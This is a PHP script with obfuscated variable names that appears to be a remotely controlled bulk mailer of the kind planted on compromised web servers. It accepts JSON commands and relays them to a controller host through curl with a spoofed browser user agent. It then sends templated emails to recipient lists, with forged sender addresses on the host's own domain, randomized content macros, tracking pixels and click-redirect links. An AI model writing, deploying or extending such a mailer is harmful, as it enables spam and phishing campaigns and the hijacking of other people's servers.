<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp8d5c14) { if ($sp8d5c14 == 'keys') { return array_keys($this->_keys); } } public function Import($sp8d5c14, $sp1b440c) { if (is_array($sp1b440c)) { $this->values[$sp8d5c14] = array(); foreach ($sp1b440c as $spead76b) { if (!empty($spead76b['key'])) { $this->values[$sp8d5c14][$spead76b['key']] = $spead76b['value']; } else { $this->values[$sp8d5c14][] = $spead76b['value']; } } } else { $this->Assign($sp8d5c14, $sp1b440c); } } public function Assign($sp8d5c14, $sp1243c8) { $this->values[$sp8d5c14] = $sp1243c8; } public function Parse($sp4e3590) { $sp5d2a33 = ''; $sp2dbcc3 = 0; while (true) { $sp00992a = strpos($sp4e3590, '{', $sp2dbcc3); if ($sp00992a === false) { $sp5d2a33 .= substr($sp4e3590, $sp2dbcc3); break; } $sp5d2a33 .= substr($sp4e3590, $sp2dbcc3, $sp00992a - $sp2dbcc3); $sp2dbcc3 = $sp00992a + 1; $spab22e3 = ''; $spb17b4f = '{'; $spbc2625 = array(); $spee7b1b = false; $sp89d14c = false; $sp719033 = 'var'; while ($sp2dbcc3 < strlen($sp4e3590)) { $sp59ed0f = substr($sp4e3590, $sp2dbcc3, 1); $spb17b4f .= $sp59ed0f; if ($sp59ed0f == ',' || $sp59ed0f == '>' || $sp59ed0f == '|') { if ($sp719033 == 'alias') { $spee7b1b = $spab22e3; } elseif ($sp719033 == 'mod') { $sp89d14c = $spab22e3; } else { $spbc2625[] = $spab22e3; } $spab22e3 = ''; if ($sp59ed0f == '>') { $sp719033 = 'alias'; } if ($sp59ed0f == '|') { $sp719033 = 'mod'; } $sp2dbcc3++; continue; } if ($sp59ed0f == '}') { if ($sp719033 == 'alias') { $spee7b1b = $spab22e3; } elseif ($sp719033 == 'mod') { $sp89d14c = $spab22e3; } else { $spbc2625[] = $spab22e3; } $sp2dbcc3++; break; } $spab22e3 .= $sp59ed0f; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp59ed0f) == 0) { $sp2dbcc3++; $spbc2625 = array(); break; } $sp2dbcc3++; } if (sizeof($spbc2625) == 0) { $sp5d2a33 .= $spb17b4f; continue; } $spb21fc5 = false; $spf87e26 = false; if (preg_match('/^\\^/', $spbc2625[0]) > 0) { $spbc2625[0] = substr($spbc2625[0], 1); $spb21fc5 = true; } if (preg_match('/^\\!/', $spbc2625[0]) > 0) { $spbc2625[0] = substr($spbc2625[0], 1); $spf87e26 = true; } $sp050ac4 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spbc2625[0], $sp3e9d90) > 0) { $sp050ac4 = $sp3e9d90[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spbc2625[0], $sp3e9d90) > 0) { $sp050ac4 = explode('-', $sp3e9d90[1]); } if ($sp050ac4 !== false) { $spbc2625[0] = substr($spbc2625[0], 0, strpos($spbc2625[0], '[')); } $this->_keys[$spbc2625[0]] = true; if (empty($this->values[$spbc2625[0]]) && empty($this->fixed[$spbc2625[0]])) { continue; } if ($spb21fc5) { unset($this->fixed[$spbc2625[0]]); } if (isset($this->fixed[$spbc2625[0]])) { $sp8cb14d = $this->fixed[$spbc2625[0]]; } else { $sp8cb14d = ''; $sp33bce9 = 1; if (sizeof($spbc2625) == 2) { $sp33bce9 = $spbc2625[1]; } if (sizeof($spbc2625) == 3) { $sp33bce9 = rand($spbc2625[1], $spbc2625[2]); } for ($sp1bcee7 = 0; $sp1bcee7 < $sp33bce9; $sp1bcee7++) { if (is_array($this->values[$spbc2625[0]])) { if (!is_array($this->used[$spbc2625[0]])) { $this->used[$spbc2625[0]] = array(); } if (count($this->used[$spbc2625[0]]) == count($this->values[$spbc2625[0]])) { $this->used[$spbc2625[0]] = array(); } if ($sp050ac4 !== false && is_scalar($sp050ac4)) { $sp8cb14d .= $this->values[$spbc2625[0]][$sp050ac4]; $this->used[$sp050ac4] = true; } else { $sp2ae20e = array(); if (is_array($sp050ac4)) { $spc02ebc = $sp050ac4[0]; $spaf791e = $sp050ac4[1]; } else { $spc02ebc = 0; $spaf791e = count($this->values[$spbc2625[0]]) - 1; } for ($sp53613b = $spc02ebc; $sp53613b <= $spaf791e; $sp53613b++) { if ($spf87e26 && !empty($this->used[$spbc2625[0]][$sp53613b])) { continue; } $sp2ae20e[] = $sp53613b; } $sp2e5807 = $sp2ae20e[rand(0, count($sp2ae20e) - 1)]; $this->used[$spbc2625[0]][$sp2e5807] = true; $sp8cb14d .= $this->values[$spbc2625[0]][$sp2e5807]; } } else { $sp8cb14d .= $this->values[$spbc2625[0]]; } } } $sp8cb14d = $this->Parse($sp8cb14d); if ($sp89d14c !== false) { for ($spcb563c = 0; $spcb563c < strlen($sp89d14c); $spcb563c++) { switch (substr($sp89d14c, $spcb563c, 1)) { case 'b': $sp8cb14d = base64_encode($sp8cb14d); break; case 'q': $sp8cb14d = quoted_printable_encode($sp8cb14d); break; default: break; } } } if ($spb21fc5) { $this->fixed[$spbc2625[0]] = $sp8cb14d; } if ($spee7b1b !== false && $spee7b1b != '') { $this->fixed[$spee7b1b] = $sp8cb14d; } $sp5d2a33 .= $sp8cb14d; } return $sp5d2a33; } } $spa81dbc = file_get_contents('php://input'); $sp886ee5 = json_decode($spa81dbc, true); if (empty($sp886ee5['via_proxy'])) { $sp886ee5['via_proxy'] = true; $spbdd83d = curl_init($sp886ee5['prefix'] . 's.php'); $sp03c27f = json_encode($sp886ee5); curl_setopt($spbdd83d, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($spbdd83d, CURLOPT_TIMEOUT, 600); curl_setopt($spbdd83d, CURLOPT_RETURNTRANSFER, true); curl_setopt($spbdd83d, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($spbdd83d, CURLOPT_REFERER, $sp6e458b); curl_setopt($spbdd83d, CURLOPT_POST, true); curl_setopt($spbdd83d, CURLOPT_POSTFIELDS, $sp03c27f); curl_setopt($spbdd83d, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp03c27f))); $sp7c6dfa = curl_exec($spbdd83d); echo $sp7c6dfa; die; } $spfb8b2e = $_SERVER['SERVER_ADDR']; $sp4b60f8 = $_SERVER['HTTP_HOST']; $sp4b60f8 = preg_replace('/^www\\./', '', $sp4b60f8); $sp2fe5fd = new Macros(); $sp2fe5fd->Assign('server_addr', $spfb8b2e); $sp2fe5fd->Assign('server_host', $sp4b60f8); foreach ($sp886ee5['macros'] as $sp8d5c14 => $sp1b440c) { $sp2fe5fd->Import($sp8d5c14, $sp1b440c); } $sp4beea8 = preg_replace('/^www\\./i', '', $sp4b60f8); $sp9accf7 = $sp2fe5fd->Parse('{from_user}@' . $sp4beea8); $sp2fe5fd->Assign('from_email', $sp9accf7); $sp2fe5fd->Assign('prefix', $sp886ee5['prefix']); $sp2fe5fd->Assign('html', $sp886ee5['letter']['html']); $sp2dbcc3 = 0; $sp4e5f64 = 0; $sp41f1ce = 0; $spd29ebe = array(); foreach ($sp886ee5['rcpt'] as $sp71d41b) { $sp2fe5fd->Assign('email', $sp71d41b['email']); $sp2fe5fd->Assign('entry', $sp71d41b); $sp2fe5fd->Assign('date', date('r')); $sp2fe5fd->Assign('redirect', $sp886ee5['prefix'] . 'r.php?id=' . $sp71d41b['id'] . '&uri='); $sp2fe5fd->Assign('unsubscribe', $sp886ee5['prefix'] . 'u.php?id=' . $sp71d41b['id']); $sp2fe5fd->Assign('delivery', '<img src="' . $sp886ee5['prefix'] . 'd.php?id=' . $sp71d41b['id'] . '" />'); $sp61f851 = $sp2fe5fd->Parse($sp886ee5['envelope']['header']); $sp13cc92 = $sp2fe5fd->Parse($sp886ee5['envelope']['body']); if (!empty($sp71d41b['name'])) { $sp454167 = $sp71d41b['name'] . ' <' . $sp71d41b['email'] . '>'; } else { $sp454167 = $sp71d41b['email']; } $spd9e786 = $sp2fe5fd->Parse($sp886ee5['letter']['subject']); $sp1a5baa = mail($sp454167, $spd9e786, $sp13cc92, $sp61f851); $spd29ebe[$sp71d41b['id']] = $sp1a5baa; if ($sp1a5baa) { $sp4e5f64++; } else { $sp41f1ce++; } $sp2dbcc3++; } echo serialize(array('total' => count($sp886ee5['rcpt']), 'sent' => $sp2dbcc3, 'success' => $sp4e5f64, 'error' => $sp41f1ce, 'rcpt' => $spd29ebe));